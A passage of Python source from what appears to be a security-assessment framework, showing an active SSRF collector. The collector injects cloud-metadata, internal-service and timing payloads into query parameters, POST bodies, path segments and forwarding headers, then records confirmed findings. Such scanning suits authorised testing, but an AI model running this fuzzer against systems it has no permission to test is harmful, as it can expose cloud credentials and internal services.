            r"(?:results\s+for|searched\s+for|query\s*:|echo\s*:)\s*[\"']?" + re.escape(clean_snippet),
            re.IGNORECASE,
        )
        if search_echo_pattern.search(body) and len(body.split(clean_snippet)) == 2:
            # Check if there is genuine metadata/service content outside the reflection
            has_genuine_signature = any(
                sig_meta["pattern"].search(body.replace(clean_snippet, ""))
                for sig_meta in {**CLOUD_METADATA_SIGNATURES, **INTERNAL_SERVICE_SIGNATURES}.values()
            )
            if not has_genuine_signature:
                return True

        return False


# =============================================================================
# SSRF Collector Implementation
# =============================================================================

class SSRFCollector(BaseCollector):
    """
    ARGUS Collector for active Server-Side Request Forgery (SSRF) validation.
    Fuzzes GET query parameters, POST body fields (form and JSON), RESTful path segments,
    and HTTP headers using AuthenticatedHttpClient.
    """

    def __init__(
        self,
        http_client: Optional[AuthenticatedHttpClient] = None,
        timeout: float = 15.0,
        delay_threshold: float = 4.0,
    ):
        self.http_client = http_client
        self.timeout = timeout
        self.delay_threshold = delay_threshold
        self.generator = SSRFPayloadGenerator()
        self.analyzer = SSRFAnalyzer()

    def _extract_candidate_endpoints(self, raw_mission: Any) -> List[Dict[str, Any]]:
        """
        Extracts and normalizes target endpoints from mission state or constructs
        standard probe routes against discovered live hosts and target URL.
        """
        candidates: List[Dict[str, Any]] = []
        seen_urls: Set[str] = set()

        # 1. Inspect mission.endpoints
        endpoints = getattr(raw_mission, "endpoints", []) or []
        for ep in endpoints:
            url = None
            method = "GET"
            params: Dict[str, Any] = {}
            body: Any = None
            headers: Dict[str, str] = {}

            if isinstance(ep, str):
                url = ep
            elif isinstance(ep, dict):
                url = ep.get("url") or ep.get("endpoint")
                method = ep.get("method", "GET").upper()
                params = ep.get("params") or {}
                body = ep.get("body")
                headers = ep.get("headers") or {}
            elif hasattr(ep, "url"):
                url = getattr(ep, "url")
                method = getattr(ep, "method", "GET")

            if url and isinstance(url, str) and url.startswith("http") and url not in seen_urls:
                seen_urls.add(url)
                parsed = urllib.parse.urlparse(url)
                base_url = f"{parsed.scheme}://{parsed.netloc}"
                candidates.append({
                    "url": url,
                    "base_url": base_url,
                    "path": parsed.path or "/",
                    "method": method,
                    "params": params,
                    "body": body,
                    "headers": headers,
                    "source": "mission.endpoints",
                })

        # 2. Inspect mission.live_hosts or mission.subdomains
        live_hosts = getattr(raw_mission, "live_hosts", []) or []
        target = getattr(raw_mission, "target", "") or ""
        host_urls: List[str] = []

        for lh in live_hosts:
            if isinstance(lh, str) and lh.startswith("http"):
                host_urls.append(lh)
            elif isinstance(lh, dict) and lh.get("url"):
                host_urls.append(lh["url"])
            elif isinstance(lh, str) and lh:
                host_urls.append(f"http://{lh}")

        if not host_urls and target:
            host_urls.append(target if target.startswith("http") else f"http://{target}")

        for base_url in host_urls:
            parsed_base = urllib.parse.urlparse(base_url)
            clean_base = f"{parsed_base.scheme}://{parsed_base.netloc}" if parsed_base.netloc else base_url
            if clean_base not in seen_urls and not candidates:
                seen_urls.add(clean_base)
                candidates.append({
                    "url": clean_base,
                    "base_url": clean_base,
                    "path": "/",
                    "method": "GET",
                    "params": {},
                    "body": None,
                    "headers": {},
                    "source": "live_host",
                })

            # If fewer than 5 candidate endpoints exist, seed with common SSRF probe routes
            if len(candidates) < 5:
                for route in DEFAULT_SSRF_PROBE_ROUTES[:4]:
                    probe_url = f"{clean_base.rstrip('/')}{route}"
                    if probe_url not in seen_urls:
                        seen_urls.add(probe_url)
                        candidates.append({
                            "url": probe_url,
                            "base_url": clean_base,
                            "path": route,
                            "method": "GET",
                            "params": {"url": "http://127.0.0.1"},
                            "body": None,
                            "headers": {},
                            "source": "default_probe",
                        })

        return candidates

    def _execute_request(
        self,
        mission: Any,
        method: str,
        url: str,
        params: Optional[Dict[str, Any]] = None,
        data: Optional[Dict[str, Any]] = None,
        json_data: Optional[Any] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Optional[HttpResponse]:
        """
        Dispatches HTTP request using custom injected client or AuthenticatedHttpClient.
        """
        method = method.upper()
        try:
            if self.http_client is not None:
                if method == "GET" and hasattr(self.http_client, "get"):
                    try:
                        return self.http_client.get(
                            mission, url, params=params, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        try:
                            return self.http_client.get(mission, url, timeout=self.timeout)
                        except TypeError:
                            return self.http_client.get(url)
                elif method == "POST" and hasattr(self.http_client, "post"):
                    try:
                        return self.http_client.post(
                            mission, url, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        try:
                            return self.http_client.post(mission, url, timeout=self.timeout)
                        except TypeError:
                            return self.http_client.post(url)
                elif hasattr(self.http_client, "request"):
                    try:
                        return self.http_client.request(
                            mission, method, url, params=params, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        return self.http_client.request(method, url)
                elif callable(self.http_client):
                    return self.http_client(url)
                return None

            with AuthenticatedHttpClient(timeout=self.timeout, max_retries=1) as client:
                if method == "GET":
                    return client.get(mission, url, params=params, headers=headers, cookies=cookies, timeout=self.timeout)
                elif method == "POST":
                    return client.post(mission, url, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout)
                else:
                    return client.request(mission, method, url, params=params, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout)
        except Exception as e:
            logger.debug(f"SSRFCollector request failed for {url}: {e}")
            return None

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes active Server-Side Request Forgery (SSRF) fuzzing across discovered endpoints and parameters.
        """
        raw_mission = getattr(mission, "_mission", mission)
        candidates = self._extract_candidate_endpoints(raw_mission)
        if not candidates:
            logger.info("SSRFCollector: No candidate endpoints or hosts to fuzz.")
            return []

        logger.info(f"SSRFCollector: Fuzzing {len(candidates)} candidate endpoint(s)...")

        detected_evidence: List[Evidence] = []
        confirmed_vuln_keys: Set[str] = set()

        cloud_targets = self.generator.generate_cloud_metadata_payloads()
        internal_targets = self.generator.generate_internal_service_payloads()
        timing_targets = self.generator.generate_timing_payloads(delay=5.0)

        for candidate in candidates:
            orig_url = candidate["url"]
            base_url = candidate["base_url"]
            parsed_url = urllib.parse.urlparse(orig_url)
            method = candidate.get("method", "GET")
            raw_params = candidate.get("params") or {}
            body_data = candidate.get("body")
            headers_data = dict(candidate.get("headers") or {})

            # 0. Measure Baseline Response
            start_base = time.time()
            baseline_resp = self._execute_request(
                mission=raw_mission,
                method=method,
                url=orig_url,
                params=raw_params if method == "GET" else None,
                data=body_data if method == "POST" and isinstance(body_data, dict) else None,
                headers=headers_data,
            )
            baseline_elapsed = getattr(baseline_resp, "elapsed", 0.0) if baseline_resp else (time.time() - start_base)

            # -------------------------------------------------------------
            # Vector 1: GET Query Parameters
            # -------------------------------------------------------------
            query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
            if not query_params and raw_params and method == "GET":
                for k, v in raw_params.items():
                    query_params[k] = [str(v)]

            # If no parameters in URL but route is common SSRF probe route, test common SSRF params
            if not query_params and method == "GET" and (candidate.get("source") == "default_probe" or parsed_url.path in DEFAULT_SSRF_PROBE_ROUTES):
                query_params = {"url": ["http://127.0.0.1"], "target": ["http://localhost"]}

            if query_params:
                for param_name in list(query_params.keys()):
                    param_vuln_found = False

                    # 1.1 Cloud Metadata Fuzzing
                    for target_info in cloud_targets:
                        base_target_url = target_info["url"]
                        mutated_variants = self.generator.generate_mutated_payloads(base_target_url)
                        for payload in mutated_variants[:6]:
                            mut_query = dict(query_params)
                            mut_query[param_name] = [payload]
                            target_url = urllib.parse.urlunparse((
                                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                parsed_url.params, urllib.parse.urlencode(mut_query, doseq=True), parsed_url.fragment,
                            ))

                            req_headers = dict(headers_data)
                            if "headers" in target_info:
                                req_headers.update(target_info["headers"])

                            resp = self._execute_request(mission, "GET", target_url, headers=req_headers)
                            if not resp:
                                continue

                            analysis = self.analyzer.analyze_cloud_metadata(
                                response=resp,
                                baseline=baseline_resp,
                                target_info=target_info,
                            )
                            if analysis:
                                vuln_key = f"{parsed_url.path}:{param_name}:{analysis['template_id']}"
                                if vuln_key not in confirmed_vuln_keys:
                                    confirmed_vuln_keys.add(vuln_key)
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=target_url,
                                        base_url=base_url,
                                        param=param_name,
                                        param_type="query",
                                        payload=payload,
                                        status_code=getattr(resp, "status_code", 200) or 200,
                                        analysis=analysis,
                                    )
                                    detected_evidence.append(ev)
                                    param_vuln_found = True
                                    break
                        if param_vuln_found:
                            break

                    # 1.2 Internal Service Fuzzing
                    if not param_vuln_found:
                        for target_info in internal_targets:
                            base_target_url = target_info["url"]
                            mutated_variants = self.generator.generate_mutated_payloads(base_target_url)
                            for payload in mutated_variants[:5]:
                                mut_query = dict(query_params)
                                mut_query[param_name] = [payload]
                                target_url = urllib.parse.urlunparse((
                                    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                    parsed_url.params, urllib.parse.urlencode(mut_query, doseq=True), parsed_url.fragment,
                                ))

                                resp = self._execute_request(mission, "GET", target_url, headers=headers_data)
                                if not resp:
                                    continue

                                analysis = self.analyzer.analyze_internal_service(
                                    response=resp,
                                    baseline=baseline_resp,
                                    target_info=target_info,
                                )
                                if analysis:
                                    vuln_key = f"{parsed_url.path}:{param_name}:{analysis['template_id']}"
                                    if vuln_key not in confirmed_vuln_keys:
                                        confirmed_vuln_keys.add(vuln_key)
                                        ev = self._create_evidence_and_update_state(
                                            mission=mission,
                                            target_url=target_url,
                                            base_url=base_url,
                                            param=param_name,
                                            param_type="query",
                                            payload=payload,
                                            status_code=getattr(resp, "status_code", 200) or 200,
                                            analysis=analysis,
                                        )
                                        detected_evidence.append(ev)
                                        param_vuln_found = True
                                        break
                            if param_vuln_found:
                                break

                    # 1.3 Differential Timing Fuzzing
                    if not param_vuln_found:
                        for target_info in timing_targets[:2]:
                            drop_url = target_info["url"]
                            mut_query = dict(query_params)
                            mut_query[param_name] = [drop_url]
                            target_url = urllib.parse.urlunparse((
                                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                parsed_url.params, urllib.parse.urlencode(mut_query, doseq=True), parsed_url.fragment,
                            ))

                            resp = self._execute_request(mission, "GET", target_url, headers=headers_data)
                            if not resp:
                                continue

                            analysis = self.analyzer.analyze_differential_timing(
                                injected_resp=resp,
                                baseline_resp=baseline_resp,
                                threshold=self.delay_threshold,
                            )
                            if analysis:
                                vuln_key = f"{parsed_url.path}:{param_name}:{analysis['template_id']}"
                                if vuln_key not in confirmed_vuln_keys:
                                    confirmed_vuln_keys.add(vuln_key)
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=target_url,
                                        base_url=base_url,
                                        param=param_name,
                                        param_type="query",
                                        payload=drop_url,
                                        status_code=getattr(resp, "status_code", 200) or 200,
                                        analysis=analysis,
                                    )
                                    detected_evidence.append(ev)
                                    param_vuln_found = True
                                    break

            # -------------------------------------------------------------
            # Vector 2: POST Body (JSON & Form-Urlencoded)
            # -------------------------------------------------------------
            post_fields: Dict[str, Any] = {}
            is_json_body = False
            if method == "POST" or body_data is not None:
                if isinstance(body_data, dict):
                    post_fields = dict(body_data)
                    is_json_body = True
                elif isinstance(body_data, str) and body_data.strip().startswith("{"):
                    try:
                        post_fields = json.loads(body_data)
                        is_json_body = True
                    except Exception:
                        pass
                elif raw_params and method == "POST":
                    post_fields = dict(raw_params)

            if not post_fields and method == "POST" and (candidate.get("source") == "default_probe" or parsed_url.path in DEFAULT_SSRF_PROBE_ROUTES):
                post_fields = {"url": "http://127.0.0.1", "target": "http://localhost"}

            if post_fields:
                clean_target_url = urllib.parse.urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path, "", "", ""
                ))
                for field_name in list(post_fields.keys()):
                    post_vuln_found = False

                    # 2.1 Cloud Metadata
                    for target_info in cloud_targets:
                        base_target_url = target_info["url"]
                        mutated_variants = self.generator.generate_mutated_payloads(base_target_url)
                        for payload in mutated_variants[:5]:
                            mut_body = dict(post_fields)
                            mut_body[field_name] = payload

                            req_headers = dict(headers_data)
                            if "headers" in target_info:
                                req_headers.update(target_info["headers"])

                            if is_json_body:
                                resp = self._execute_request(mission, "POST", clean_target_url, json_data=mut_body, headers=req_headers)
                            else:
                                resp = self._execute_request(mission, "POST", clean_target_url, data=mut_body, headers=req_headers)

                            if not resp:
                                continue

                            analysis = self.analyzer.analyze_cloud_metadata(resp, baseline=baseline_resp, target_info=target_info)
                            if analysis:
                                vuln_key = f"{parsed_url.path}:{field_name}:{analysis['template_id']}"
                                if vuln_key not in confirmed_vuln_keys:
                                    confirmed_vuln_keys.add(vuln_key)
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=clean_target_url,
                                        base_url=base_url,
                                        param=field_name,
                                        param_type="json" if is_json_body else "body",
                                        payload=payload,
                                        status_code=getattr(resp, "status_code", 200) or 200,
                                        analysis=analysis,
                                    )
                                    detected_evidence.append(ev)
                                    post_vuln_found = True
                                    break
                        if post_vuln_found:
                            break

                    # 2.2 Internal Services
                    if not post_vuln_found:
                        for target_info in internal_targets:
                            base_target_url = target_info["url"]
                            mutated_variants = self.generator.generate_mutated_payloads(base_target_url)
                            for payload in mutated_variants[:4]:
                                mut_body = dict(post_fields)
                                mut_body[field_name] = payload

                                if is_json_body:
                                    resp = self._execute_request(mission, "POST", clean_target_url, json_data=mut_body, headers=headers_data)
                                else:
                                    resp = self._execute_request(mission, "POST", clean_target_url, data=mut_body, headers=headers_data)

                                if not resp:
                                    continue

                                analysis = self.analyzer.analyze_internal_service(resp, baseline=baseline_resp, target_info=target_info)
                                if analysis:
                                    vuln_key = f"{parsed_url.path}:{field_name}:{analysis['template_id']}"
                                    if vuln_key not in confirmed_vuln_keys:
                                        confirmed_vuln_keys.add(vuln_key)
                                        ev = self._create_evidence_and_update_state(
                                            mission=mission,
                                            target_url=clean_target_url,
                                            base_url=base_url,
                                            param=field_name,
                                            param_type="json" if is_json_body else "body",
                                            payload=payload,
                                            status_code=getattr(resp, "status_code", 200) or 200,
                                            analysis=analysis,
                                        )
                                        detected_evidence.append(ev)
                                        post_vuln_found = True
                                        break
                            if post_vuln_found:
                                break

                    # 2.3 Differential Timing
                    if not post_vuln_found:
                        for target_info in timing_targets[:2]:
                            drop_url = target_info["url"]
                            mut_body = dict(post_fields)
                            mut_body[field_name] = drop_url

                            if is_json_body:
                                resp = self._execute_request(mission, "POST", clean_target_url, json_data=mut_body, headers=headers_data)
                            else:
                                resp = self._execute_request(mission, "POST", clean_target_url, data=mut_body, headers=headers_data)

                            if not resp:
                                continue

                            analysis = self.analyzer.analyze_differential_timing(resp, baseline_resp=baseline_resp, threshold=self.delay_threshold)
                            if analysis:
                                vuln_key = f"{parsed_url.path}:{field_name}:{analysis['template_id']}"
                                if vuln_key not in confirmed_vuln_keys:
                                    confirmed_vuln_keys.add(vuln_key)
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=clean_target_url,
                                        base_url=base_url,
                                        param=field_name,
                                        param_type="json" if is_json_body else "body",
                                        payload=drop_url,
                                        status_code=getattr(resp, "status_code", 200) or 200,
                                        analysis=analysis,
                                    )
                                    detected_evidence.append(ev)
                                    post_vuln_found = True
                                    break

            # -------------------------------------------------------------
            # Vector 3: RESTful Path Segments
            # -------------------------------------------------------------
            path_segments = [s for s in parsed_url.path.strip("/").split("/") if s]
            if path_segments:
                for idx, segment in enumerate(path_segments):
                    # Fuzz URL-like, fetch-like, or ID-like segments
                    if segment.isdigit() or segment.startswith("http") or "%3A" in segment.lower() or "%2f" in segment.lower() or segment in ("proxy", "fetch", "view", "preview", "download", "url", "redirect"):
                        path_vuln_found = False
                        for target_info in cloud_targets[:5]:
                            payload = target_info["url"]
                            for enc_payload in [urllib.parse.quote(payload, safe=""), payload]:
                                mutated_segs = list(path_segments)
                                mutated_segs[idx] = enc_payload
                                mut_path = "/" + "/".join(mutated_segs)
                                target_url = urllib.parse.urlunparse((
                                    parsed_url.scheme, parsed_url.netloc, mut_path,
                                    parsed_url.params, parsed_url.query, parsed_url.fragment,
                                ))

                                req_headers = dict(headers_data)
                                if "headers" in target_info:
                                    req_headers.update(target_info["headers"])

                                resp = self._execute_request(mission, "GET", target_url, headers=req_headers)
                                if not resp:
                                    continue

                                analysis = self.analyzer.analyze_cloud_metadata(resp, baseline=baseline_resp, target_info=target_info)
                                if analysis:
                                    vuln_key = f"{parsed_url.path}:path_segment_{idx}:{analysis['template_id']}"
                                    if vuln_key not in confirmed_vuln_keys:
                                        confirmed_vuln_keys.add(vuln_key)
                                        ev = self._create_evidence_and_update_state(
                                            mission=mission,
                                            target_url=target_url,
                                            base_url=base_url,
                                            param=f"path_segment_{idx}",
                                            param_type="path",
                                            payload=payload,
                                            status_code=getattr(resp, "status_code", 200) or 200,
                                            analysis=analysis,
                                        )
                                        detected_evidence.append(ev)
                                        path_vuln_found = True
                                        break
                            if path_vuln_found:
                                break


            # -------------------------------------------------------------
            # Vector 4: HTTP Request Headers (Referer, X-Forwarded-For, X-Forwarded-Host, X-Original-URL, X-Rewrite-URL)
            # -------------------------------------------------------------
            header_targets = [
                ("Referer", "{payload}"),
                ("X-Forwarded-For", "{payload}"),
                ("X-Forwarded-Host", "{payload}"),
                ("X-Original-URL", "{payload}"),
                ("X-Rewrite-URL", "{payload}"),
                ("X-Custom-IP-Authorization", "{payload}"),
            ]
            clean_url = urllib.parse.urlunparse((
                parsed_url.scheme, parsed_url.netloc, parsed_url.path, "", "", ""
            ))
            for header_name, template_fmt in header_targets:
                for target_info in cloud_targets[:3]:
                    payload = target_info["url"]
                    injected_val = template_fmt.format(payload=payload)
                    mut_headers = dict(headers_data)
                    mut_headers[header_name] = injected_val
                    if "headers" in target_info:
                        mut_headers.update(target_info["headers"])

                    resp = self._execute_request(mission, "GET", clean_url, headers=mut_headers)
                    if not resp:
                        continue

                    analysis = self.analyzer.analyze_cloud_metadata(resp, baseline=baseline_resp, target_info=target_info)
                    if analysis:
                        vuln_key = f"{parsed_url.path}:{header_name}:{analysis['template_id']}"
                        if vuln_key not in confirmed_vuln_keys:
                            confirmed_vuln_keys.add(vuln_key)
                            ev = self._create_evidence_and_update_state(
                                mission=mission,
                                target_url=clean_url,
                                base_url=base_url,
                                param=header_name,
                                param_type="header",
                                payload=payload,
                                status_code=getattr(resp, "status_code", 200) or 200,
                                analysis=analysis,
                            )
                            detected_evidence.append(ev)
                            break

        logger.info(
            f"SSRFCollector complete: {len(detected_evidence)} SSRF vulnerability(ies) identified."
        )
        return detected_evidence

    def _create_evidence_and_update_state(
        self,
        mission: Any,
        target_url: str,
        base_url: str,
        param: str,
        param_type: str,
        payload: str,
        status_code: int,
        analysis: Dict[str, Any],
    ) -> Evidence:
        """
        Constructs Evidence, appends to mission.evidence & mission.vulnerabilities,
        and expands the KnowledgeGraph attack surface with HAS_ENDPOINT and HAS_VULNERABILITY edges.
        """
        raw_mission = getattr(mission, "_mission", mission)
        template_id = analysis.get("template_id", "ssrf")
        technique = analysis.get("technique", SSRFTechnique.CLOUD_METADATA.value)
        severity = analysis.get("severity", Severity.CRITICAL)
        if isinstance(severity, Severity):
            severity = severity.value
        confidence = analysis.get("confidence", 0.95)
        snippet = analysis.get("snippet", "")
        cloud_provider = analysis.get("cloud_provider", "")
        target_service = analysis.get("target_service", "generic")

        parsed_url = urllib.parse.urlparse(target_url)
        url_path = parsed_url.path or "/"

        technique_labels = {
            SSRFTechnique.CLOUD_METADATA.value: f"Cloud Metadata ({cloud_provider.upper() if cloud_provider else 'Generic'})",
            SSRFTechnique.INTERNAL_SERVICE.value: f"Internal Service ({target_service.upper()})",
            SSRFTechnique.DIFFERENTIAL_TIMING.value: "Differential Timing Latency",
        }
        tech_label = technique_labels.get(technique, technique)

        title = f"Server-Side Request Forgery: {param} on {target_url}"
        description = (
            f"Server-Side Request Forgery ({tech_label}) vulnerability confirmed on endpoint {target_url} "
            f"via {param_type} parameter '{param}' using payload '{payload}'. "
            f"Evidence: {snippet[:200]}"
        )

        ev = Evidence(
            mission_id=getattr(raw_mission, "id", ""),
            source_type="LOG",
            created_by="SYSTEM_GENERATED",
            title=title,
            description=description,
            category="ssrf",
            value=target_url,
            source=target_url,
            status="CONFIRMED",
            confidence=confidence,
            severity=severity,
            provenance=ProvenanceData(
                step_id="ssrf_collector",
            ),
            tags=["ssrf", "server_side_request_forgery", technique, template_id],
            metadata={
                "url": target_url,
                "host": base_url,
                "path": url_path,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "category": "ssrf",
                "severity": severity,
                "technique": technique,
                "template_id": template_id,
                "cloud_provider": cloud_provider,
                "target_service": target_service,
                "status_code": status_code,
                "evidence_snippet": snippet[:250],
            },
        )

        # 1. Add to raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Add to raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": f"Server-Side Request Forgery ({tech_label})",
                "template_id": template_id,
                "severity": severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "technique": technique,
                "cloud_provider": cloud_provider,
                "target_service": target_service,
            })

        # 3. KnowledgeGraph Node & Edge Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{template_id}:{target_url}:{param}"

            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=f"Server-Side Request Forgery ({tech_label})", metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. Publish to ControlledMission wrapper
        if mission is not raw_mission and hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.evidence_id if hasattr(ev, "evidence_id") else getattr(ev, "id", ""), ev)
            except Exception:
                pass

        return ev

    def execute(self, mission: Any) -> List[Evidence]:
        """Plugin / Specialist adapter interface."""
        return self.collect(mission)
